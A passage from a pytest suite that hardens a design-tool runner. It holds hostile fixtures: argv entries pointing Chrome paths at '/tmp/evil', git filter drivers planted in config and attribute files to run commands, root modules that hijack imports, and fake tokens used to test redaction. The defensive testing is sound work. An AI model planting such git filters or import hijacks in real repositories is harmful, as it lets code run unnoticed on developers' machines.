    ("state-tests", "argv", ["test", "<spec-filter>", "tests"], "argv"),
    ("state-tests", "argv", ["test", "<spec-filter>", "{feature}"], "argv"),
    ("state-tests", "argv", ["test", "<spec-filter>", "--pass-with-no-tests"], "argv"),
    ("visual-diff", "argv", ["test", "--grep-invert", "."], "argv"),
    ("visual-diff", "argv", ["test", "--grep", "{feature}"], "argv"),
    ("visual-diff", "argv", ["test", "--grep", "-c/tmp/x.ts"], "argv"),
    ("visual-diff", "argv", ["test", "--grep", "visual regression", "tests"], "argv"),
    ("visual-diff", "argv", ["test", "--grep", "visual regression", "-c/tmp/x.ts"], "argv"),
    ("ui-screenshot", "argv", ["screenshot", "--load-storage=/tmp/s.json", "{url}", "<out>/<run-id>.png"], "argv"),
    ("ui-screenshot", "argv", ["screenshot", "{url}", "<out>/<run-id>.png", "-c/tmp/x.ts"], "argv"),
    ("ui-screenshot", "argv", ["screenshot", "-c/tmp/x.ts", "{url}", "<out>/<run-id>.png"], "argv"),
    ("ui-capture", "bin", "npx", "bin"),
    ("axe-scan", "bin", "pa11y", "bin"),
    # Chris C13b-1: `--update-snapshots [mode]` would swallow a following positional as its mode
    ("baseline-capture", "argv", ["test", "--update-snapshots", "<spec-filter>"], "argv"),
    ("ui-capture", "argv", ["test", "--update-snapshots=none", "--update-snapshots", "<spec-filter>"], "argv"),
    # Sentinel S13b-3: `axe` argv is exactly the shipped form
    ("axe-scan", "argv", AXE_ARGV + ["--chromedriver-path=/tmp/evil"], "argv"),
    ("axe-scan", "argv", ["--chrome-path", "/tmp/evil"] + AXE_ARGV, "argv"),
    ("axe-scan", "argv", ["{url}", "--axe-source", "/tmp/axe.js"] + AXE_ARGV[1:], "argv"),
    ("axe-scan", "argv", AXE_ARGV + ["--tags", "wcag2a"], "argv"),
    ("axe-scan", "argv", ["{url}"], "argv"),
    # I-4 (U5): an absolute `--save` is path.join-ed onto the cwd (the project root) by the real CLI
    ("axe-scan", "argv", ["{url}", "--save", "<out>/<run-id>.axe.json"], "argv"),
    ("axe-scan", "argv", ["{url}", "--dir", "<out>/", "--save", "<out>/<run-id>.axe.json"], "argv"),
    ("axe-scan", "argv", ["{url}", "--save", "<run-id>.axe.json"], "argv"),
    ("axe-scan", "argv", ["{url}", "--dir", "<root>", "--save", "<run-id>.axe.json"], "argv"),
    ("axe-scan", "argv", ["{url}", "--dir", "<out>/", "--save", "sub/<run-id>.axe.json"], "argv"),
    ("axe-scan", "argv", ["{url}", "--dir", "<out>/", "--save", "<run-id>.json"], "argv"),
]


@pytest.mark.parametrize("template,field,value,expect", CATALOGUE_NARROWING)
def test_catalogue_value_narrowing_a_check_fails_closed(dr, template, field, value, expect):
    cat = json.loads(CATALOGUE.read_text())
    cat["templates"][template][field] = value
    with pytest.raises(dr.Blocked) as exc:
        dr._validate_catalogue(cat)
    assert (exc.value.token, exc.value.detail) == ("design-run-schema", "catalogue %s %s" % (template, expect))


# Bella F-1: a child-chosen staging file name reaches the report redacted (SAC-27)

def test_design_run_child_chosen_staging_name_is_redacted(proj, dr):
    token = SECRETS["ghp"]
    proj.set_ctl("axe", save_text="{}", extra_files={token: "x", "plain.txt": "y"})
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s)
    assert res.code == 0, res.err
    run = res.run("r1")
    assert {"name": "<REDACTED>", "reason": "undeclared"} in run["dropped"], run["dropped"]
    assert {"name": "plain.txt", "reason": "undeclared"} in run["dropped"]
    assert run["redactions"]["artifacts"] >= 1
    assert token.encode() not in _all_output_bytes(proj)


# Bella F-10: runs[].executable is a realpath for plugin scripts too

def test_plugin_python_executable_is_the_interpreter_realpath(proj, dr):
    link = proj.tmp / "pylink"
    os.symlink(os.path.realpath(PY), link)
    o, s = proj.order([RUN_PAIR])
    res = proj.run(dr, o, s, patches=[(sys, "executable", str(link))])
    r1 = res.run("r1")
    assert res.code == 0 and r1["argv"][0] == str(link), (res.code, res.err)
    assert r1["executable"] == os.path.realpath(PY) != str(link)


# Erratum-2 §3 item 2: the `-I -c` bootstrap never imports a module from the project root

def test_bootstrap_never_imports_a_project_root_module(proj):
    mark = proj.markers / "HOSTILE-root-module"
    for mod in ("core", "runpy"):           # search.py's sibling, and the bootstrap's own import
        proj.write(mod + ".py", "open(%r, 'a').write(%r)\nraise SystemExit(97)\n" % (str(mark), mod + "\n"))
    proj.commit("tracked root modules")
    order, sha = proj.order([{"id": "r1", "script_id": "design-search",
                              "params": {"query": "hotel booking", "variance": 4, "motion": 3, "density": 6,
                                         "project": "Acme"}}], phase="1b")
    p = proj.cli(order, sha)
    assert not mark.exists(), "imported from the project root: " + mark.read_text()
    assert p.returncode == 0, p.stderr.decode()
    ds = json.loads((proj.root / "outputs/t-1/design-run/02-design-run-order-1b-iter1/r1.json").read_text())
    assert ds["design_system"]["project_name"] == "Acme"


# ------------------------------------------------------------------------------------------------
# v7u.4.13 iter 2: Sentinel S13-1..S13-4, Chris C13-1..C13-3, Bella A-1
# ------------------------------------------------------------------------------------------------

# S13-1: a control or format character right before a known token format. JSON-escaping turns it
# into `\n`, `\t`, `​`, `\u001b`, whose last character is a letter, so a redaction that runs
# only after the escape misses the token. The names are child- or project-chosen.

AKIA = "AKIA" + "Z7Q3XW9R2M4N8P5T"   # concatenated so secret scanners do not flag the fixture (Sentinel I-2)
BEARER_VALUE = "b3arerS3cretValue77"
SK = "sk-" + "Z9y8X7w6V5u4T3s2R1q0"
ESCAPED_TOKEN_CASES = [
    ("newline-ghp", "x\n" + SECRETS["ghp"], [SECRETS["ghp"]]),
    # Chris C22-4: the fixed-length gh rule withholds the two ghp names whole, so this case keeps
    # the raw -> escape -> redact order exercised by a token that has no fixed length
    ("newline-sk", "x\n" + SK, [SK]),
    ("tab-akia", "x\t" + AKIA, [AKIA]),
    ("zwsp-ghp", "​" + SECRETS["ghp"], [SECRETS["ghp"]]),
    ("esc-bearer", "\x1bBearer " + BEARER_VALUE, [BEARER_VALUE]),
    ("zwsp-split-ghp", SECRETS["ghp"][:24] + "​" + SECRETS["ghp"][24:],
     [SECRETS["ghp"][:24], SECRETS["ghp"][24:]]),
]


def _no_token_bytes(data, parts):
    leaked = [p for p in parts if p.encode() in data]
    assert leaked == [], leaked


@pytest.mark.parametrize("case,name,parts", ESCAPED_TOKEN_CASES)
def test_show_redacts_before_and_after_the_escape_unit(dr, case, name, parts):
    shown, n = dr._show_redacted(name)
    assert n >= 1 and dr._show(name) == shown, (shown, n)
    _no_token_bytes(shown.encode(), parts)
    assert dr._show_redacted("plain-name.txt") == ("plain-name.txt", 0)
    assert dr._show("a\nb") == '"a\\nb"'                     # odd characters still escaped


@pytest.mark.parametrize("case,name,parts", ESCAPED_TOKEN_CASES)
def test_escaped_token_in_a_dropped_staging_name_is_redacted(proj, dr, case, name, parts):
    proj.set_ctl("axe", save_text="{}", extra_files={name: "x"})
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s)
    assert res.code == 0, res.err
    run = res.run("r1")
    assert [d for d in run["dropped"] if d["reason"] == "undeclared"], run["dropped"]
    assert run["redactions"]["artifacts"] >= 1
    _no_token_bytes(_all_output_bytes(proj), parts)


@pytest.mark.parametrize("case,name,parts", ESCAPED_TOKEN_CASES)
def test_escaped_token_in_a_tree_changed_path_is_redacted(proj, dr, case, name, parts):
    proj.set_ctl("axe", create=[name])                     # written into the root while the child runs
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s)
    r1 = res.run("r1")
    assert res.code == 1 and r1["status"] == "tree-changed" and len(r1["tree_changed_paths"]) == 1, r1
    _no_token_bytes(_all_output_bytes(proj), parts)


@pytest.mark.parametrize("case,name,parts", ESCAPED_TOKEN_CASES)
def test_escaped_token_in_a_blocked_line_is_redacted(proj, dr, case, name, parts):
    proj.write(name, "planted before the run\n")
    o, s = proj.order([RUN_PAIR])
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    _no_token_bytes(err.encode(), parts)


def test_mutation_escape_then_redact_turns_escaped_tokens_red(proj, dr):
    """The pre-fix order `_redact(_escape(name))` leaks on all three sites."""
    old = (dr, "_show_redacted", lambda p: dr._redact(dr._escape(p)))
    sk = SK                                     # not ghp: its fixed-length rule needs no boundary (S13b-4)
    proj.set_ctl("axe", save_text="{}", extra_files={"x\n" + sk: "x"})
    o, s = proj.order([RUN_AXE])
    proj.run(dr, o, s, patches=[old], audit=False)
    assert sk.encode() in _all_output_bytes(proj)                         # dropped[].name
    proj.set_ctl("axe", create=["y\t" + AKIA])
    o, s = proj.order([RUN_AXE], it=2)
    assert proj.run(dr, o, s, patches=[old], audit=False).run("r1")["status"] == "tree-changed"
    assert AKIA.encode() in _all_output_bytes(proj)                       # tree_changed_paths
    proj.write("z\x1bBearer " + BEARER_VALUE, "planted\n")
    o, s = proj.order([RUN_PAIR], it=3)
    assert BEARER_VALUE in proj.run(dr, o, s, patches=[old], audit=False).err   # BLOCKED line


# S13-3: a filter driver and an attribute source planted while the child runs are refused before
# the runner's own post-run `git status` could execute the filter

def _plant_filter(proj, where):
    """A concurrent writer: a filter driver in .git/config, an attribute naming it, and a stat-dirty
    tracked file the attribute covers (Sentinel filt.py / filt2.py)."""
    with open(proj.root / ".git/config", "a") as fh:
        fh.write('[filter "zz"]\n\tclean = %s\n' % proj.hostile("late-filter"))
    attrs = proj.root / (".git/info/attributes" if where == "info" else ".gitattributes")
    attrs.parent.mkdir(exist_ok=True)
    attrs.write_text("package.json filter=zz\n")
    future = time.time() + 5
    os.utime(proj.root / "package.json", (future, future))       # stat-dirty, content unchanged


def _plant_filter_during_child(proj, dr, where):
    real = dr._spawn_child

    def spawn_then_plant(*a, **k):
        out = real(*a, **k)
        _plant_filter(proj, where)
        return out
    return spawn_then_plant


@pytest.mark.parametrize("where", ["info", "worktree"])
def test_filter_planted_during_the_child_is_never_run_by_the_runner(proj, dr, where):
    o, s = proj.order([RUN_AXE, dict(RUN_AXE, id="r2")])
    res = proj.run(dr, o, s, patches=[(dr, "_spawn_child", _plant_filter_during_child(proj, dr, where))])
    r1 = res.run("r1")
    assert res.code == 1 and res.report["exit"] == 1, (res.code, res.err)
    assert r1["status"] == "tree-changed", r1
    assert r1["reason"].startswith("design-run-untrusted-input git-config filter.zz.clean (file:.git/config)"), r1
    if where == "info":
        assert ".git/info/attributes (attributes-source)" in r1["reason"], r1
    assert res.run("r2")["status"] == "skipped" and res.run("r2")["reason"] == "tree-changed"
    assert proj.hostiles() == []
    proj.git("status", "--porcelain")                  # positive control: a plain status runs the plant
    assert proj.hostiles() == ["HOSTILE-late-filter"]


def test_mutation_rescan_off_turns_late_filter_red(proj, dr):
    """Without the re-scan the `.git/info/attributes` variant ran the filter and exited 0 clean."""
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "_spawn_child", _plant_filter_during_child(proj, dr, "info")),
                                      (dr, "_deny_rescan", lambda ctx: None)], audit=False)
    assert res.code == 0 and res.run("r1")["status"] == "exit"
    assert proj.hostiles() == ["HOSTILE-late-filter"]


@pytest.mark.parametrize("where", ["info", "worktree"])
def test_filter_planted_after_a_post_run_refuses_the_next_run_before_status(proj, dr, where):
    """The pre-run side: the plant lands after r1's post-run checks, so r2's pre-run re-scan (before
    its snapshot's `status`) is the layer that refuses it; r2 never starts."""
    real = dr._post_run

    def post_run_then_plant(*a, **k):
        out = real(*a, **k)
        _plant_filter(proj, where)
        return out

    o, s = proj.order([RUN_PAIR, dict(RUN_UI, id="r2")])
    res = proj.run(dr, o, s, patches=[(dr, "_post_run", post_run_then_plant)])
    r2 = res.run("r2")
    assert res.code == 1 and res.run("r1")["status"] == "exit", (res.code, res.err)
    assert r2["status"] == "tree-changed" and "git-config filter.zz.clean" in r2["reason"], r2
    assert proj.stub_calls("playwright") == [] and proj.hostiles() == []


# S13-2: the Playwright argv allowlist accepts every shipped template

def test_shipped_playwright_templates_pass_the_argv_allowlist(dr):
    cat = json.loads(CATALOGUE.read_text())
    pw = [n for n, t in cat["templates"].items() if t.get("bin") == "playwright"]
    assert sorted(pw) == ["baseline-capture", "state-tests", "ui-capture", "ui-screenshot", "visual-diff"]
    assert all(dr._playwright_argv_ok(cat["templates"][n]) for n in pw)
    dr._validate_catalogue(cat)


# C13-1: per-run E0 precedes the per-run `git status`; S13-3: a config re-scan precedes every one

def _audit_marks(dr, log):
    real_prepare, real_post, real_spawn = dr._prepare, dr._post_run, dr._spawn_child

    def mark(name):
        with open(log, "a") as fh:
            fh.write(json.dumps({"mark": name}) + "\n")

    def prepare(*a, **k):
        out = real_prepare(*a, **k)
        mark("prepared")
        return out

    def spawn(*a, **k):
        mark("child")
        return real_spawn(*a, **k)

    def post_run(*a, **k):
        out = real_post(*a, **k)
        mark("post-run")
        return out
    return [(dr, "_prepare", prepare), (dr, "_spawn_child", spawn), (dr, "_post_run", post_run)]


def test_git_argv_audit_order_per_run(proj, dr):
    path, log = _audit_wrapper(proj)
    o, s = proj.order([RUN_UI, dict(RUN_STATE, id="r2")])
    res = proj.run(dr, o, s, path=path, patches=_audit_marks(dr, log))
    assert res.code == 0, res.err
    entries = [json.loads(line) for line in log.read_text().splitlines()]
    assert [e["mark"] for e in entries if "mark" in e] == ["prepared", "child", "post-run", "child", "post-run"]
    assert sum(1 for e in entries if "argv" in e and _sub(e) == "status") >= 5
    _check_audit(entries)


def test_check_order_rejects_status_before_e0_or_without_rescan():
    def g(*sub):
        return {"argv": SAFE_PREFIX + list(sub), "cwd": "/"}
    good = [g("config", "--list"), {"mark": "prepared"}, g("ls-files", "-s"), g("config", "--list"),
            g("ls-files", "-v"), g("status")]
    _check_order(good)
    with pytest.raises(AssertionError):           # per-run snapshot before E0 (Chris C13-1 order)
        _check_order([g("config", "--list"), {"mark": "prepared"}, g("config", "--list"), g("status"),
                      g("ls-files", "-s")])
    with pytest.raises(AssertionError):           # a status with no re-scan since the previous one
        _check_order(good + [g("ls-files", "-v"), g("status")])


# C13-3: an edit right after the per-run `_tree_check` returns (the check -> snapshot window when
# the snapshot came after the check) is reported

@pytest.mark.parametrize("tracked", ["playwright.config.ts", "package-lock.json"])
def test_design_run_edit_right_after_the_per_run_check_is_tree_changed(proj, dr, tracked):
    real, calls = dr._tree_check, []

    def check_then_edit(ctx, plan, created=()):
        out = real(ctx, plan, created)
        calls.append(1)
        if len(calls) == 2:                               # the per-run call (the first is step 7)
            with open(os.path.join(ctx.root, tracked), "a") as fh:
                fh.write("// concurrent edit\n")
        return out

    o, s = proj.order([RUN_UI])
    res = proj.run(dr, o, s, patches=[(dr, "_tree_check", check_then_edit)])
    r1 = res.run("r1")
    assert len(calls) == 2 and res.code == 1 and r1["status"] == "tree-changed", r1
    assert r1["tree_changed_paths"] == [tracked], r1


# ------------------------------------------------------------------------------------------------
# v7u.4.22: Sentinel S13b-1..S13b-4, Chris C13b-1, C13b-2, S-1
# ------------------------------------------------------------------------------------------------

# S13b-1: a child-chosen name never reaches outputs/ or stderr through an exit-4 traceback, and an
# OSError while the child's effects are inspected is a tree change

def _lock_dir_after_child(proj, dr, name):
    """The child plants `tests/<name>` and then makes the tracked `tests` dir unsearchable."""
    real = dr._spawn_child

    def spawn_then_lock(*a, **k):
        out = real(*a, **k)
        (proj.root / "tests" / name).write_text("planted\n")
        os.chmod(proj.root / "tests", 0o600)
        return out
    return spawn_then_lock


@pytest.mark.skipif(os.geteuid() == 0, reason="root ignores directory permissions (Chris C22-6)")
def test_child_making_a_tracked_dir_unsearchable_is_tree_changed(proj, dr):
    o, s = proj.order([RUN_AXE, dict(RUN_AXE, id="r2")])
    try:
        lock = _lock_dir_after_child(proj, dr, "x\n" + SECRETS["ghp"])
        res = proj.run(dr, o, s, patches=[(dr, "_spawn_child", lock)])
    finally:
        os.chmod(proj.root / "tests", 0o755)
    r1 = res.run("r1")
    assert res.code == 1 and res.report["exit"] == 1 and res.report["error"] is None, (res.code, res.err)
    assert r1["status"] == "tree-changed" and r1["reason"].startswith("design-run-untrusted-input "), r1
    assert r1["reason"].endswith("(Permission denied)"), r1
    assert res.run("r2")["status"] == "skipped" and res.run("r2")["reason"] == "tree-changed"
    _no_token_bytes(_all_output_bytes(proj) + res.err.encode(), [SECRETS["ghp"]])


def test_os_error_in_the_prerun_checks_is_tree_changed(proj, dr):
    def unreadable(ctx):
        raise PermissionError(13, "Permission denied", os.path.join(ctx.root, "tests", "x\n" + SECRETS["ghp"]))

    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "_snapshot", unreadable)])
    r1 = res.run("r1")
    assert res.code == 1 and r1["status"] == "tree-changed" and res.spawns == [], (res.code, res.err, r1)
    assert r1["reason"] == "design-run-untrusted-input <REDACTED> (Permission denied)", r1
    _no_token_bytes(_all_output_bytes(proj), [SECRETS["ghp"]])


TRACEBACK_NAME_CASES = [
    ("newline-ghp", "x\n" + SECRETS["ghp"], [SECRETS["ghp"]]),
    ("esc-akia", "x\x1b" + AKIA, [AKIA]),
    ("zwsp-split-ghp", SECRETS["ghp"][:24] + "\u200b" + SECRETS["ghp"][24:], [SECRETS["ghp"][:24], SECRETS["ghp"][24:]]),
]


def _raise_os_error(shape, filename, filename2):
    """Chris C22-2: the 4th positional argument of OSError is `winerror`, so `filename2` is the 5th.
    Chris C22-3: `context` / `cause` put the OSError under a RuntimeError, implicitly or with `from`."""
    exc = PermissionError(13, "Permission denied", filename, None, filename2)
    if shape == "plain":
        raise exc
    try:
        raise exc
    except OSError as inner:
        if shape == "cause":
            raise RuntimeError("wrapped") from inner
        raise RuntimeError("wrapped")


@pytest.mark.parametrize("shape", ["plain", "context", "cause"])
@pytest.mark.parametrize("case,name,parts", TRACEBACK_NAME_CASES)
def test_exit_4_traceback_shows_os_error_file_names_redacted(proj, dr, case, name, parts, shape):
    def boom(*a, **k):
        _raise_os_error(shape, str(proj.root / "tests" / name), "/elsewhere/" + name)

    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "_stage_out", boom)])
    error = res.report["error"]
    assert res.code == 4 and "PermissionError" in error and "' -> '" in error, (res.code, res.err, error)
    assert ("RuntimeError: wrapped" in error) == (shape != "plain"), error
    _no_token_bytes(_all_output_bytes(proj), parts)
    o, s = proj.order([RUN_AXE], it=2)                     # before the report: the traceback goes to stderr
    res = proj.run(dr, o, s, patches=[(dr, "_prepare", boom)])
    assert res.code == 4 and res.report is None and "PermissionError" in res.err, (res.code, res.err)
    assert "' -> '" in res.err, res.err
    _no_token_bytes(res.err.encode(), parts)


def test_exit_4_traceback_message_escape_is_redacted(proj, dr):
    """The escape-aware pass: a repr inside a message, not a file name (`\\x1b` ends in `b`)."""
    def boom(*a, **k):
        raise RuntimeError("cannot read %r" % ("x\x1b" + AKIA))

    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "_stage_out", boom)])
    assert res.code == 4 and "RuntimeError" in res.report["error"], (res.code, res.err)
    _no_token_bytes(_all_output_bytes(proj), [AKIA])


def test_redact_escaped_unit(dr):
    text = "x: '/p/x\\x1b%s' '\\u200b%s' '\\\\n%s'" % (AKIA, SECRETS["ghp"], "sk-" + "a1" * 10)
    out, n = dr._redact_escaped(text)
    assert n >= 3 and AKIA not in out and SECRETS["ghp"] not in out and "a1" * 10 not in out, out
    plain = 'File "/src/new_tests/notes.py", line 3, in <module>\n    raise RuntimeError("x\\ty")'
    assert dr._redact_escaped(plain) == (plain, 0)


# S13b-2: a filter driver planted in user-scope config while the child runs is refused too

def _plant_user_filter(proj, where):
    home = proj.tmp / "home"
    cfg = home / (".config/git/config" if where == "xdg" else ".gitconfig")
    cfg.parent.mkdir(parents=True, exist_ok=True)
    with open(cfg, "a") as fh:
        fh.write('[filter "zz"]\n\tclean = %s\n' % proj.hostile("user-filter"))
    attrs = home / ".config/git/attributes" if where == "xdg" else proj.root / ".gitattributes"
    attrs.parent.mkdir(parents=True, exist_ok=True)
    attrs.write_text("package.json filter=zz\n")
    future = time.time() + 5
    os.utime(proj.root / "package.json", (future, future))       # stat-dirty, content unchanged


def _plant_user_filter_during_child(proj, dr, where):
    real = dr._spawn_child

    def spawn_then_plant(*a, **k):
        out = real(*a, **k)
        _plant_user_filter(proj, where)
        return out
    return spawn_then_plant


@pytest.mark.parametrize("where", ["xdg", "home"])
def test_user_scope_filter_planted_during_the_child_is_never_run(proj, dr, where):
    o, s = proj.order([RUN_AXE, dict(RUN_AXE, id="r2")])
    res = proj.run(dr, o, s, patches=[(dr, "_spawn_child", _plant_user_filter_during_child(proj, dr, where))])
    r1 = res.run("r1")
    assert res.code == 1 and r1["status"] == "tree-changed", (res.code, res.err, r1)
    assert r1["reason"].startswith("design-run-untrusted-input git-config filter.zz.clean (file:"), r1
    assert r1["reason"].endswith("(new since step 1)"), r1
    assert res.run("r2")["status"] == "skipped" and res.run("r2")["reason"] == "tree-changed"
    assert proj.hostiles() == []


def test_mutation_user_scope_compare_off_turns_user_filter_red(proj, dr):
    """Without the step-1 comparison the XDG plant ran the filter and the run exited 0 clean."""
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "_spawn_child", _plant_user_filter_during_child(proj, dr, "xdg")),
                                      (dr, "_deny_records", lambda records: frozenset())], audit=False)
    assert res.code == 0 and res.run("r1")["status"] == "exit", (res.code, res.err)
    assert proj.hostiles() == ["HOSTILE-user-filter"]


def test_user_scope_deny_record_present_at_step_1_does_not_block(proj, dr):
    gitiso.config_global(proj.tmp, "filter.keep.clean", "cat")
    o, s = proj.order([RUN_AXE, dict(RUN_AXE, id="r2")])
    res = proj.run(dr, o, s)
    assert res.code == 0, (res.code, res.err)
    keys = res.report["git"]["config_scan"]["deny_set_keys"]
    assert {"key": "filter.keep.clean", "verdict": "user-trusted"}.items() <= next(
        k for k in keys if k["key"] == "filter.keep.clean").items(), keys


def test_user_scope_filter_command_changed_during_the_child_is_never_run(proj, dr):
    """Chris C22-1: the record's value is part of the step-1 comparison. A user filter present at
    step 1 whose command the child rewrites is a new record; a value-blind compare ran it."""
    gitiso.config_global(proj.tmp, "filter.keep.clean", "cat")
    real = dr._spawn_child

    def spawn_then_change(*a, **k):
        out = real(*a, **k)
        cfg = proj.tmp / "home" / ".gitconfig"
        cfg.write_text(cfg.read_text().replace("= cat", "= %s" % proj.hostile("changed-value")))
        (proj.root / ".gitattributes").write_text("package.json filter=keep\n")
        future = time.time() + 5
        os.utime(proj.root / "package.json", (future, future))      # stat-dirty, content unchanged
        return out

    o, s = proj.order([RUN_AXE, dict(RUN_AXE, id="r2")])
    res = proj.run(dr, o, s, patches=[(dr, "_spawn_child", spawn_then_change)])
    r1 = res.run("r1")
    assert proj.hostiles() == [], proj.hostiles()
    assert res.code == 1 and r1["status"] == "tree-changed", (res.code, res.err, r1)
    assert r1["reason"].startswith("design-run-untrusted-input git-config filter.keep.clean (file:"), r1
    assert r1["reason"].endswith("(new since step 1)"), r1
    assert res.run("r2")["status"] == "skipped" and res.run("r2")["reason"] == "tree-changed"


# S13b-3: the shipped axe-scan argv passes its allowlist

def test_shipped_axe_template_passes_the_argv_allowlist(dr):
    cat = json.loads(CATALOGUE.read_text())
    assert [n for n, t in cat["templates"].items() if t.get("bin") == "axe"] == ["axe-scan"]
    assert dr._axe_argv_ok(cat["templates"]["axe-scan"])
    assert cat["templates"]["axe-scan"]["argv"] == AXE_ARGV == dr.CAT_AXE_ARGV


# I-4 (U5, outputs/shode-house-v7u/27-quinn-axe-probe.md): the stub saves the way the real CLI does,
# path.join(--dir or cwd, --save), so the shipped argv lands in the stage and the old absolute
# `--save` form does not

def test_axe_argv_puts_the_stage_in_dir_and_a_bare_name_in_save(proj, dr):
    proj.set_ctl("axe", save_text="{}")
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s)
    assert res.code == 0, res.err
    argv = proj.stub_calls("axe")[0]["argv"]
    assert argv[0] == RUN_AXE["params"]["url"] and argv[1] == "--dir" and argv[3:] == ["--save", "r1.axe.json"]
    assert os.path.isabs(argv[2]) and argv[2].endswith(os.sep + "out" + os.sep + "r1" + os.sep), argv
    assert not os.path.realpath(argv[2]).startswith(os.path.realpath(str(proj.root)) + os.sep), argv
    run = res.run("r1")
    assert [a["name"] for a in run["artifacts"]] == ["r1.axe.json"] and run["dropped"] == [], run
    assert (proj.root / (RUN_DIR + "r1.axe.json")).read_text() == "{}"


def _old_axe_argv_catalogue():
    cat = json.loads(CATALOGUE.read_text())
    cat["templates"]["axe-scan"]["argv"] = ["{url}", "--save", "<out>/<run-id>.axe.json"]
    return cat, hashlib.sha256(json.dumps(cat).encode()).hexdigest()


def test_axe_old_absolute_save_never_reaches_the_stage(proj, dr):
    """Mutation: the pre-fix argv with the allowlist widened to it. The real CLI fails (attempt A)."""
    proj.set_ctl("axe", save_text="{}")
    cat = _old_axe_argv_catalogue()
    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "_load_catalogue", lambda: cat),
                                      (dr, "CAT_AXE_ARGV", cat[0]["templates"]["axe-scan"]["argv"])])
    run = res.run("r1")
    assert res.code == 1 and run["exit_code"] == 1, (res.code, run)
    assert {"name": "r1.axe.json", "reason": "missing"} in run["dropped"] and run["artifacts"] == [], run
    assert not (proj.root / (RUN_DIR + "r1.axe.json")).exists()


def test_axe_old_absolute_save_into_the_project_tree_is_tree_changed(proj, dr):
    """Mutation, attempt G: the joined parent already exists under the root, so the real CLI writes
    the artifact inside the project tree with exit 0; the runner must not call that a pass."""
    proj.set_ctl("axe", save_text="{}")
    cat = _old_axe_argv_catalogue()
    real_stage = dr._stage_dir

    def stage(private, run_dir, run_id):
        path = real_stage(private, run_dir, run_id)
        os.makedirs(str(proj.root) + path, exist_ok=True)     # the parent path.join(cwd, save) needs
        return path

    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "_load_catalogue", lambda: cat), (dr, "_stage_dir", stage),
                                      (dr, "CAT_AXE_ARGV", cat[0]["templates"]["axe-scan"]["argv"])])
    run = res.run("r1")
    assert res.code == 1 and (run["status"], run["exit_code"]) == ("tree-changed", 0), (res.code, run)
    leaked = str(proj.root) + run["argv"][run["argv"].index("--save") + 1]
    assert os.path.isfile(leaked), leaked                       # the stub wrote where the real CLI would
    top = os.path.relpath(leaked, str(proj.root)).split(os.sep)[0] + "/"
    assert run["tree_changed_paths"] == [top] and run["artifacts"] == [], run
    assert not (proj.root / (RUN_DIR + "r1.axe.json")).exists()


# S13b-4: two rule-shape residuals closed without touching ordinary names

def test_redaction_rule_shape_residuals_unit(dr):
    g = SECRETS["ghp"]
    assert dr._redact("x" + g) == ("x<REDACTED>", 1)                     # letter before a GitHub token
    # Chris C22-5: a longer gh string is redacted whole (the fixed rule's right boundary), never
    # cut after 36 characters with its tail left visible
    assert dr._redact("/p/ghp_" + "a" * 40) == ("/p/<REDACTED>", 1)
    assert dr._show_redacted(g[:20] + "\u0301" + g[20:])[0] == "<REDACTED>"   # split by a combining mark
    for ordinary in ("laughp_notes.md", "risk-assessment-report-v2.md", "re\u0301sume\u0301.txt",
                     "task-abcdefghijklmnopqrstu", "caf\u00e9/ghp_short.txt"):
        assert dr._show_redacted(ordinary) == (ordinary, 0), ordinary


# Chris S-1: a filter planted between the per-run snapshot and the per-run check (the window the
# re-scan in _tree_check closes) is refused before the check's `status`, and no child starts

@pytest.mark.parametrize("where", ["info", "worktree"])
def test_filter_planted_between_the_snapshot_and_the_check_is_never_run(proj, dr, where):
    real, calls = dr._snapshot, []

    def snap_then_plant(ctx):
        out = real(ctx)
        calls.append(1)
        if len(calls) == 1:                 # r1's pre-run snapshot (step 7 takes none)
            _plant_filter(proj, where)
        return out

    o, s = proj.order([RUN_AXE])
    res = proj.run(dr, o, s, patches=[(dr, "_snapshot", snap_then_plant)])
    r1 = res.run("r1")
    assert proj.hostiles() == [], proj.hostiles()
    assert res.code == 1 and r1["status"] == "tree-changed" and "filter.zz.clean" in r1["reason"], r1
    assert res.spawns == []


# ------------------------------------------------------------------------------------------------
# v7u.4.24: Bella L-1, L-2 (SAC-27 report fields), Sentinel S16-I3
# ------------------------------------------------------------------------------------------------

# L-1: the ignore source in `negated <src>` / `ignore-source <src>` is project-chosen, so it is
# shown through _show (escaped, redacted, withheld whole when a token is split) like the entry

IGNORE_SOURCE_DIRS = [
    ("zwsp-split-ghp", SECRETS["ghp"][:24] + "\u200b" + SECRETS["ghp"][24:],
     [SECRETS["ghp"][:24], SECRETS["ghp"][24:]]),
    ("newline-sk", "x\n" + SK, [SK]),
]


@pytest.mark.parametrize("kind,rules", [("ignore-source", "*.log\n"), ("negated", "*.log\n!a.log\n")])
@pytest.mark.parametrize("case,dirname,parts", IGNORE_SOURCE_DIRS)
def test_untrusted_ignore_source_name_is_shown_escaped_and_redacted(proj, dr, case, dirname, parts, kind, rules):
    proj.write(dirname + "/keep.md", "tracked\n")           # a tracked dir, so git lists its entries
    proj.commit("dir")
    proj.write(dirname + "/.gitignore", rules)                # untracked: not a trusted source
    proj.write(dirname + "/a.log", "planted\n")
    o, s = proj.order([RUN_PAIR])
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert "(%s " % kind in err, err
    assert err.count("\n") == 1 and err.endswith("\n"), err            # one BLOCKED line, escaped
    _no_token_bytes(err.encode(), parts)


# L-2: host- and project-chosen strings in the report carry no token (metric: 0 runner-written
# bytes under outputs/ that match the redaction set)

def _sac27_metric(dr, data):
    return dr._redact(data.decode("utf-8", "surrogateescape"))[1]


def test_report_fields_chosen_by_the_host_or_project_are_redacted(proj, dr):
    g = SECRETS["ghp"]
    proj.write(g + "/.gitignore", "*.log\n")                             # tree_check[].source
    proj.write(g + "/keep.md", "tracked\n")
    proj.commit("dir")
    proj.write(g + "/a.log", "ignored by the tracked source\n")
